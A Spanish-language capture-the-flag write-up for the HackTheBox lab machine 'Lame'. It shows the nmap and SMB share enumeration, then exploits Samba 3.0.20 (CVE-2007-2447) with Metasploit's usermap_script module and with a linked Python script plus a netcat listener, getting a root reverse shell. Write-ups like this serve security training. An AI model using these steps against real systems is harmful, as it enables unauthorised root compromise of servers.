---
title: "Lame - HackTheBox"
layout: post
date: 2023-12-03 22:10
tag: 
- hackthebox
- Lame
image: /assets/images/htb.png
headerImage: true
projects: false
hidden: false
description: "Lame - HackTheBox"
category: blog
author: CAHOn3R
externalLink: false
---



Conexión
Conectar nuestra máquina de ataque a la VPN:

$ openvpn gorkamu-htb.ovpn
Capturar User Flag
Hacemos un nmap a la máquina para ver los puertos abiertos.

$ nmap -sC -sV 10.10.10.3
Y vemos que tiene lo siguiente:

nmap
Lo primero que llama la atención es el FTP anónimo por el puerto 21.

Nos conectamos por FTP al servidor (usuario: anonymous, password: anonymous):


Explain
$ ftp 10.10.10.3 Connected to 10.10.10.3. 220 (vsFTPd 2.3.4) Name (10.10.10.3:kali): anonymous 331 Please specify the password. Password: anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files.
Si ejecutamos el comando “pwd” en el FTP veremos que estamos en la raíz y si ejecutamos “dir” o “ls” veremos que el servidor está vacío, no hay ficheros.

Salimos del FTP con un “quit”.

El siguiente puerto que vemos es el 139 por TCP asignado a Samba.

Si ejecutamos el script smb-enum-shares de nmap podemos ver los siguientes resultados:


Explain
$ nmap --script smb-enum-shares -p445 -Pn 10.10.10.3 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-04 10:08 CET Nmap scan report for 10.10.10.3 Host is up (0.047s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-enum-shares: | account_used: <blank> | \\10.10.10.3\ADMIN$: | Type: STYPE_IPC | Comment: IPC Service (lame server (Samba 3.0.20-Debian)) | Users: 1 | Max Users: <unlimited> | Path: C:\tmp | Anonymous access: <none> | \\10.10.10.3\IPC$: | Type: STYPE_IPC | Comment: IPC Service (lame server (Samba 3.0.20-Debian)) | Users: 1 | Max Users: <unlimited> | Path: C:\tmp | Anonymous access: READ/WRITE | \\10.10.10.3\opt: Type: STYPE_DISKTREE | Comment: | Users: 1 | Max Users: <unlimited> | Path: C:\tmp | Anonymous access: <none> | \\10.10.10.3\print$: | Type: STYPE_DISKTREE | Comment: Printer Drivers | Users: 1 | Max Users: <unlimited> | Path: C:\var\lib\samba\printers | Anonymous access: <none> | \\10.10.10.3\tmp: | Type: STYPE_DISKTREE | Comment: oh noes! | Users: 1 | Max Users: <unlimited> | Path: C:\tmp |_ Anonymous access: READ/WRITE Nmap done: 1 IP address (1 host up) scanned in 45.30 seconds
Esto indica que la ruta \10.10.10.3\tmp es vulnerable con acceso anónimo de lectura y escritura.

Exploit Metasploit
Vamos a ejecutar metasploit para lanzar un exploit.

$ msfconsole msf6 > search samba
Y elegimos exploit/multi/samba/usermap_script


Explain
msf6 > use exploit/multi/samba/usermap_script msg exploit(exploit/multi/samba/usermap_script) > set rhost 10.10.10.3 msg exploit(exploit/multi/samba/usermap_script) > set lhost 10.10.14.7 msg exploit(exploit/multi/samba/usermap_script) > run
Y automáticamente tendremos una shell inversa como root.

metasploit
Si navegamos a /home/makis/ veremos el fichero user.txt con la USER Flag

Exploit mediante un script
Otra forma de explotar esta vulnerabilidad sin usar metasploit es por medio de este script https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py

Nos lo descargamos mediante wget.

En una terminal nueva ponemos un netcat a escuchar por el puerto 4444 y en la terminal en la que nos hemos descargado el script lo lanzamos de la siguiente manera:

$ python3 usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>
samba exploit
Esto nos abrirá una nueva conexión en netcat con una terminal inversa.

netcat
Si navegamos a /home/makis/ veremos el fichero user.txt con la USER Flag.

Capturar Root Flag
Estando en la shell inversa explotada por el exploit de samba, al ser ya root tan solo tenemos que ir a /root/root.txt y tendremos la ROOT Flag.
